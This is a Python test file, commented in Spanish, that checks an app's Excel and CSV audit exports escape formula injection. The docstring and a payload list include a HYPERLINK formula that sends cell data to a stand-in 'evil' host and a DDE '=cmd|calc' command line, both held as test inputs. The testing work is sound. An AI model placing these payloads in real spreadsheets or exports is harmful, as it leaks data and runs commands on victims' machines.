"""Las exportaciones no deben ejecutar formulas de la base del cliente.

Un valor de texto que empieza por `=` se convierte en formula cuando se abre el
.xlsx. Reproducido con openpyxl: una celda de texto con
`=HYPERLINK("http://evil/?d="&A1,"click")` se escribe en el XML como `<f>...</f>`,
y el `.xlsx` lo descarga y abre un C-Level.

El mismo riesgo aplica al CSV de compliance de `/audit/export`, porque
`csv.QUOTE_MINIMAL` no protege contra formulas.
"""
import csv
import io
import unittest
import uuid

from fastapi.testclient import TestClient

from main import app  # noqa: F401

from app.core.database import SessionLocal
from app.core.security import sanitize_spreadsheet_value, create_access_token
from app.db.init_db import init_db
from app.modules.auth.models import User, UserSession
from app.modules.telemetry_audit.models import AuditLog


class TestSpreadsheetFormulaInjection(unittest.TestCase):
    DANGEROUS = [
        '=HYPERLINK("http://evil.example/?d="&A1,"click")',
        '=1+1',
        '+1+1',
        '@SUM(A1:A9)',
        '-2+3',
        '\t=cmd|calc',
        '\r=cmd|calc',
    ]

    def test_formula_prefixes_are_neutralized(self):
        for payload in self.DANGEROUS:
            with self.subTest(payload=payload[:24]):
                out = sanitize_spreadsheet_value(payload)
                self.assertNotEqual(
                    out[:1], "=",
                    "el valor sigue empezando por '=': openpyxl lo escribiria como <f>",
                )
                self.assertTrue(
                    out.startswith("'"),
                    f"falta el apostrofo de escape: {out!r}",
                )

    def test_text_is_preserved_after_escaping(self):
        # El apostrofo es el escape estandar: Excel lo oculta y muestra el texto.
        payload = '=HYPERLINK("x")'
        self.assertEqual(sanitize_spreadsheet_value(payload)[1:], payload)

    def test_harmless_values_are_untouched(self):
        for value in ("Cliente Normal", "123", "12.345.678-9", "2026-07-01", "", "a=b"):
            with self.subTest(valor=value):
                self.assertEqual(sanitize_spreadsheet_value(value), value)

    def test_non_strings_pass_through(self):
        for value in (None, 0, 42, 3.14, True, False):
            with self.subTest(valor=repr(value)):
                self.assertEqual(sanitize_spreadsheet_value(value), value)


class TestAuditExportCsvInjection(unittest.TestCase):
    """El CSV de compliance de /audit/export neutraliza formulas igual que el Excel."""

    @classmethod
    def setUpClass(cls):
        db = SessionLocal()
        init_db(db)
        db.close()

    def setUp(self):
        self.client = TestClient(app)
        self.db = SessionLocal()

        self.admin_user = self.db.query(User).filter(User.username == "admin").first()
        self.admin_jti = str(uuid.uuid4())
        self.admin_token = create_access_token(subject=self.admin_user.id, jti=self.admin_jti)
        self.db.add(UserSession(
            user_id=self.admin_user.id,
            jti=self.admin_jti,
            is_revoked=False
        ))
        self.db.commit()

        # Marcador unico: es el ancla para encontrar la fila en el CSV.
        self.marker = f"csvcheck_{uuid.uuid4().hex[:8]}"
        log = AuditLog(
            username=self.marker,
            user_role="=6+6",
            question_prompt="=1+1",
            sql_generated="=2+2",
            validation_status="=3+3",
            target_database="=4+4",
            error_message="=5+5",
        )
        self.db.add(log)
        self.db.commit()
        self.log_id = log.id

    def tearDown(self):
        self.db.query(AuditLog).filter(AuditLog.id == self.log_id).delete()
        self.db.commit()
        self.db.close()

    def test_export_neutralizes_formula_cells(self):
        headers = {"Authorization": f"Bearer {self.admin_token}"}
        resp = self.client.get("/api/v1/audit/export", headers=headers)
        self.assertEqual(resp.status_code, 200)

        rows = list(csv.reader(io.StringIO(resp.content.decode("utf-8-sig"))))
        user_col = rows[0].index("Usuario")
        data_row = next(r for r in rows[1:] if r[user_col] == self.marker)

        for expected in ("'=1+1", "'=2+2", "'=3+3", "'=4+4", "'=5+5", "'=6+6"):
            self.assertIn(expected, data_row)

        for cell in data_row:
            self.assertFalse(
                cell.startswith("="),
                f"celda sin neutralizar en el CSV: {cell!r}",
            )


if __name__ == "__main__":
    unittest.main()
